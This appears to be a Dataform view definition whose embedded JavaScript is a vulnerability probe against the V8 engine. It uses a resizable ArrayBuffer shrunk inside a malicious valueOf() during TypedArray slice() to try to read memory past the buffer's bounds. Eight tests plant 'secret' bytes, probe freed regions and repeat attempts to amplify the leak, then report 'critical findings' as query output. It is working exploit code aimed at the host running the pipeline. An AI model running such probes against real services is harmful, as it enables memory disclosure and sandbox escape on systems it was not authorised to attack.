config { type: "view", name: "v8_slice_memory_disclosure" }

js {
  let results = {
    probeTime: new Date().toISOString(),
    purpose: "Memory disclosure via slice() on resizable buffer during shrink"
  };

  // =============================================================================
  // TEST 1: Basic slice disclosure - shrink in start parameter
  // =============================================================================
  results.test1_basicDisclosure = {};
  try {
    const rab = new ArrayBuffer(256, { maxByteLength: 1024 });
    const view = new Uint8Array(rab);

    // Fill with known pattern
    for (let i = 0; i < 256; i++) view[i] = i;

    const evilStart = {
      valueOf() {
        rab.resize(32);  // Shrink to 32 bytes
        return 0;
      }
    };

    const sliceResult = view.slice(evilStart, 256);

    // Check what we got
    const sliceData = Array.from(sliceResult);

    // Analyze the data
    let knownBytes = 0;
    let unknownBytes = 0;
    let unknownValues = [];

    for (let i = 0; i < sliceData.length; i++) {
      if (sliceData[i] === i || sliceData[i] === 0) {
        knownBytes++;
      } else {
        unknownBytes++;
        if (unknownValues.length < 20) {
          unknownValues.push({ idx: i, expected: i, got: sliceData[i] });
        }
      }
    }

    results.test1_basicDisclosure = {
      status: "completed",
      rabByteLengthAfter: rab.byteLength,
      sliceLength: sliceResult.length,
      knownBytes,
      unknownBytes,
      first32: sliceData.slice(0, 32).map(v => v.toString(16)),
      bytes32to64: sliceData.slice(32, 64).map(v => v.toString(16)),
      bytes64to96: sliceData.slice(64, 96).map(v => v.toString(16)),
      unknownValues: unknownValues.length > 0 ? unknownValues : "none"
    };
  } catch(e) {
    results.test1_basicDisclosure = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 2: Slice with secret data after shrink boundary
  // =============================================================================
  results.test2_secretData = {};
  try {
    const rab = new ArrayBuffer(256, { maxByteLength: 1024 });
    const view = new Uint8Array(rab);

    // Fill first 64 bytes with public data
    for (let i = 0; i < 64; i++) view[i] = 0xAA;

    // Fill bytes 64-255 with "secret" data
    for (let i = 64; i < 256; i++) {
      view[i] = 0xDE;  // Secret marker
    }

    const evilStart = {
      valueOf() {
        rab.resize(64);  // Shrink to 64 bytes (secrets should be inaccessible)
        return 0;
      }
    };

    const sliceResult = view.slice(evilStart, 256);

    // Check if secrets were leaked
    let secretsFound = 0;
    let secretIndices = [];
    for (let i = 64; i < sliceResult.length; i++) {
      if (sliceResult[i] === 0xDE) {
        secretsFound++;
        if (secretIndices.length < 10) secretIndices.push(i);
      }
    }

    results.test2_secretData = {
      status: "completed",
      rabByteLengthAfter: rab.byteLength,
      sliceLength: sliceResult.length,
      secretsFound,
      secretIndices: secretIndices.length > 0 ? secretIndices : "none",
      bytes60to80: Array.from(sliceResult.slice(60, 80)).map(v => v.toString(16))
    };
  } catch(e) {
    results.test2_secretData = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 3: Multiple sequential slices after shrink
  // =============================================================================
  results.test3_multiSlice = {};
  try {
    const rab = new ArrayBuffer(256, { maxByteLength: 1024 });
    const view = new Uint8Array(rab);
    for (let i = 0; i < 256; i++) view[i] = i ^ 0xFF;  // Inverted pattern

    // Shrink once
    rab.resize(64);

    // Take multiple slices
    const slices = [];
    for (let end of [64, 128, 192, 256]) {
      try {
        const s = view.slice(0, end);
        slices.push({
          requestedEnd: end,
          actualLength: s.length,
          last8: Array.from(s.slice(-8)).map(v => v.toString(16))
        });
      } catch(e) {
        slices.push({ requestedEnd: end, error: e.message.substring(0, 50) });
      }
    }

    results.test3_multiSlice = {
      status: "completed",
      rabByteLength: rab.byteLength,
      viewLength: view.length,
      slices
    };
  } catch(e) {
    results.test3_multiSlice = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 4: Slice after grow then shrink (freed memory?)
  // =============================================================================
  results.test4_growShrink = {};
  try {
    const rab = new ArrayBuffer(64, { maxByteLength: 1024 });
    const view = new Uint8Array(rab);
    for (let i = 0; i < 64; i++) view[i] = 0x11;

    // Grow large
    rab.resize(512);

    // Fill new area with secrets
    for (let i = 64; i < 512; i++) {
      view[i] = 0xBE;  // Secret
    }

    // Now shrink back
    rab.resize(64);  // "Free" the 64-512 region

    // Try to slice the freed region
    const evilStart = {
      valueOf() {
        // Don't do anything here, buffer already shrunk
        return 0;
      }
    };

    const sliceResult = view.slice(0, 512);

    // Check for leaked secrets
    let leakedSecrets = 0;
    for (let i = 64; i < sliceResult.length; i++) {
      if (sliceResult[i] === 0xBE) leakedSecrets++;
    }

    results.test4_growShrink = {
      status: "completed",
      rabByteLength: rab.byteLength,
      sliceLength: sliceResult.length,
      leakedSecrets,
      bytes60to80: Array.from(sliceResult.slice(60, 80)).map(v => v.toString(16))
    };
  } catch(e) {
    results.test4_growShrink = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 5: DataView vs TypedArray slice comparison
  // =============================================================================
  results.test5_dvComparison = {};
  try {
    const rab = new ArrayBuffer(256, { maxByteLength: 1024 });
    const view = new Uint8Array(rab);
    const dv = new DataView(rab);

    for (let i = 0; i < 256; i++) view[i] = i;

    // Shrink during slice
    const evilStart = {
      valueOf() {
        rab.resize(32);
        return 0;
      }
    };

    // TypedArray slice
    let taSliceLen = 0;
    let taError = null;
    try {
      const taSlice = view.slice(evilStart, 256);
      taSliceLen = taSlice.length;
    } catch(e) {
      taError = e.message.substring(0, 100);
    }

    // DataView read at various offsets after shrink
    const dvReads = [];
    for (let offset of [0, 16, 31, 32, 64]) {
      try {
        const val = dv.getUint8(offset);
        dvReads.push({ offset, value: val.toString(16) });
      } catch(e) {
        dvReads.push({ offset, error: e.message.substring(0, 50) });
      }
    }

    results.test5_dvComparison = {
      status: "completed",
      rabByteLength: rab.byteLength,
      taSliceLen,
      taError,
      dvReads
    };
  } catch(e) {
    results.test5_dvComparison = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 6: subarray() vs slice() behavior
  // =============================================================================
  results.test6_subarrayVsSlice = {};
  try {
    const rab = new ArrayBuffer(256, { maxByteLength: 1024 });
    const view = new Uint8Array(rab);
    for (let i = 0; i < 256; i++) view[i] = i;

    // First test subarray
    const evilStart1 = {
      valueOf() {
        rab.resize(64);
        return 0;
      }
    };

    let subarrayResult = null;
    let subarrayError = null;
    try {
      subarrayResult = view.subarray(evilStart1, 256);
    } catch(e) {
      subarrayError = e.message.substring(0, 100);
    }

    // Restore buffer and test slice
    rab.resize(256);
    for (let i = 0; i < 256; i++) view[i] = i;

    const evilStart2 = {
      valueOf() {
        rab.resize(64);
        return 0;
      }
    };

    let sliceResult = null;
    let sliceError = null;
    try {
      sliceResult = view.slice(evilStart2, 256);
    } catch(e) {
      sliceError = e.message.substring(0, 100);
    }

    results.test6_subarrayVsSlice = {
      status: "completed",
      subarrayResult: subarrayResult ? {
        length: subarrayResult.length,
        byteLength: subarrayResult.byteLength,
        last8: subarrayResult.length > 8 ? Array.from(subarrayResult.slice(-8)).map(v => v.toString(16)) : null
      } : null,
      subarrayError,
      sliceResult: sliceResult ? {
        length: sliceResult.length,
        byteLength: sliceResult.byteLength,
        last8: sliceResult.length > 8 ? Array.from(sliceResult.slice(-8)).map(v => v.toString(16)) : null
      } : null,
      sliceError,
      finalRabByteLength: rab.byteLength
    };
  } catch(e) {
    results.test6_subarrayVsSlice = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 7: Float64Array slice - reading uninitialized memory as floats
  // =============================================================================
  results.test7_float64Slice = {};
  try {
    const rab = new ArrayBuffer(256, { maxByteLength: 1024 });
    const view = new Float64Array(rab);  // 32 elements

    // Fill with known floats
    for (let i = 0; i < 32; i++) view[i] = i + 0.5;

    const evilStart = {
      valueOf() {
        rab.resize(64);  // Now only 8 Float64 elements
        return 0;
      }
    };

    const sliceResult = view.slice(evilStart, 32);

    // Check the values
    const sliceData = [];
    for (let i = 0; i < sliceResult.length; i++) {
      const val = sliceResult[i];
      sliceData.push({
        idx: i,
        value: val,
        isNaN: Number.isNaN(val),
        isFinite: Number.isFinite(val)
      });
    }

    results.test7_float64Slice = {
      status: "completed",
      rabByteLength: rab.byteLength,
      sliceLength: sliceResult.length,
      first8: sliceData.slice(0, 8),
      afterShrinkBoundary: sliceData.slice(8, 16)
    };
  } catch(e) {
    results.test7_float64Slice = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 8: Repeated slice to amplify disclosure
  // =============================================================================
  results.test8_amplifiedDisclosure = {};
  try {
    const results_arr = [];

    for (let attempt = 0; attempt < 5; attempt++) {
      const rab = new ArrayBuffer(128, { maxByteLength: 256 });
      const view = new Uint8Array(rab);
      for (let i = 0; i < 128; i++) view[i] = (attempt * 32 + i) & 0xFF;

      const evilStart = {
        valueOf() {
          rab.resize(32);
          return 0;
        }
      };

      const sliceResult = view.slice(evilStart, 128);

      // Collect bytes beyond shrink boundary
      const beyondBoundary = Array.from(sliceResult.slice(32, 48));

      results_arr.push({
        attempt,
        sliceLength: sliceResult.length,
        beyondBoundary: beyondBoundary.map(v => v.toString(16))
      });
    }

    results.test8_amplifiedDisclosure = {
      status: "completed",
      attempts: results_arr
    };
  } catch(e) {
    results.test8_amplifiedDisclosure = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // SUMMARY
  // =============================================================================
  results.summary = {
    testsRun: 8,
    allCompleted: Object.keys(results).filter(k =>
      k.startsWith("test") && results[k].status === "completed"
    ).length,
    criticalFindings: []
  };

  // Check for actual memory disclosure
  const t1 = results.test1_basicDisclosure;
  if (t1 && t1.sliceLength > t1.rabByteLengthAfter) {
    results.summary.criticalFindings.push(
      `MEMORY DISCLOSURE: slice returned ${t1.sliceLength} bytes but buffer is ${t1.rabByteLengthAfter} bytes`
    );
  }

  const t2 = results.test2_secretData;
  if (t2 && t2.secretsFound > 0) {
    results.summary.criticalFindings.push(
      `SECRET LEAK: Found ${t2.secretsFound} secret bytes after shrink boundary`
    );
  }

  const t4 = results.test4_growShrink;
  if (t4 && t4.leakedSecrets > 0) {
    results.summary.criticalFindings.push(
      `FREED MEMORY LEAK: Found ${t4.leakedSecrets} secrets from freed region`
    );
  }
}

SELECT '${JSON.stringify(results, null, 2)}' as slice_memory_disclosure
